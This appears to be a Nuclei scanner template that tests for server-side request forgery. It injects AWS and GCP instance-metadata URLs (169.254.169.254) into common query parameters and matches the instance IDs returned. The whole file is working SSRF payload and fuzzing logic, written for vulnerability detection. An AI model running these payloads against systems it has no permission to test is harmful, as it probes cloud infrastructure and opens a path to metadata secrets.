id: THENAWABX_MULTI_CLOUD_SSRF
info:
  name: Nawab-Multi-Cloud-SSRF
  author: thenawabx
  severity: critical

http:
  - pre-condition:
      - expr: "queue.has_params"

    payloads:
      ssrf_payloads:
        - "http://169.254.169.254/latest/meta-data/instance-id"
        - "http://169.254.169.254/computeMetadata/v1/instance/id"

    fuzzing:
      - part: query
        type: replace
        mode: multiple
        keys:
          - "url"
          - "dest"
          - "uri"
          - "path"
          - "redirect"
          - "callback"
          - "link"
          - "file"
        fuzz:
          - "{{ssrf_payloads}}"

    headers:
      Metadata-Flavor: "Google"

    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: regex
        part: body
        regex:
          - "\bi-[a-f0-9]{17}\b"
          - "^[0-9]{15,25}$"
        condition: or

      - type: word
        part: body
        negative: true
        words:
          - "Forbidden"
          - "Access Denied"
          - "Cloudflare"
          - "Just a moment"
          - "example.com"
          - "aws"
          - "google"
        condition: or

    extractors:
      - type: regex
        part: body
        regex:
          - "\bi-[a-f0-9]{17}\b"
          - "\b[0-9]{15,25}\b"
